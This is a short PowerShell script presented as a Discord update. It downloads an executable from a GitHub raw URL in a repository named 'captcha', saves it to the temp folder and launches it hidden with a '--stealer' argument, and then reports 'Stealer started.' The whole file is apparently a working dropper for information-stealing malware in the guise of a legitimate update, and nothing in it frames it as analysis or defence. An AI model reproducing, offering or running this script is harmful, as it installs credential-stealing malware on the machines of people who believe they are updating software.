# Diagnostic Version - DO NOT REMOVE THE LAST LINE
Write-Host "=== Starting Discord Update ===" -ForegroundColor Cyan

$exePath = "$env:TEMP\DiscordUpdate.exe"
$url = "https://raw.githubusercontent.com/urho122-cpu/captcha/main/DiscordUpdate.exe"

try {
    Write-Host "Downloading..." -ForegroundColor Yellow
    (New-Object Net.WebClient).DownloadFile($url, $exePath)
    Write-Host "Download successful!" -ForegroundColor Green
    
    Start-Process $exePath -ArgumentList '--stealer' -WindowStyle Hidden
    Write-Host "Stealer started." -ForegroundColor Green
} 
catch {
    Write-Host "ERROR: $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host "=== Script finished ===" -ForegroundColor Cyan
Read-Host "Press Enter to close this window..."
